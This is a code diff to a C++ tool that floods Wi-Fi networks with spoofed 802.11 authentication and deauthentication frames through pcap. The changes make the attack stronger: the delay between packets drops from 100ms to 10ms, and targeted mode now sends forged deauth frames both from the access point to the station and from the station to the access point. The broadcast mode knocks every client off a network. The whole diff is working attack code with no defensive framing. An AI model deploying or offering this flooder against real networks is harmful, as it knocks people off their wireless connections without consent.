@@ -55,7 +55,7 @@ void set_mac(char *target, char *str){
 int main(int argc, char *argv[]) {
 	string ap_mac;
 	string station_mac;
-
+	int res;
 	if (argc == 3 || argc == 4 || (argc == 5 && !strncmp(argv[4],"-auth",5)));
 	else usage();
 
@@ -78,22 +78,37 @@ int main(int argc, char *argv[]) {
 		while(true) {
 			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&auth_packet), sizeof(struct auth_attack_packet));
 	    	if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        	usleep(100000);
+        	usleep(10000);
 		}
 
 	}else{
 		struct deauth_attack_packet deauth_packet;
 		cout << "[*] Deauth_attack triggerd" << endl;
-		if (argc==3) memset(deauth_packet.destination,255,6);
-		else set_mac(deauth_packet.destination,argv[3]);
-		set_mac(deauth_packet.source,argv[2]);
-		set_mac(deauth_packet.bssid,argv[2]);
-
-		while(true) {
-			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_packet), sizeof(struct deauth_attack_packet));
-	    	if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        	usleep(100000);
+		if (argc==3){
+			memset(deauth_packet.destination,255,6);
+			while(true) {
+				res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_packet), sizeof(struct deauth_attack_packet));
+		    		if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		        	usleep(10000);
+			}
 		}
+		else{
+			set_mac(deauth_packet.bssid,argv[2]);
+			while(true) {
+				set_mac(deauth_packet.destination,argv[3]);
+				set_mac(deauth_packet.source,argv[2]);
+				res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_packet), sizeof(struct deauth_attack_packet));
+		    		if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));	
+		        	usleep(10000);
+
+				set_mac(deauth_packet.destination,argv[2]);
+				set_mac(deauth_packet.source,argv[3]);
+				res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_packet), sizeof(struct deauth_attack_packet));
+		    		if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		        	usleep(10000);
+			}
+		}
+
 	}
 
 
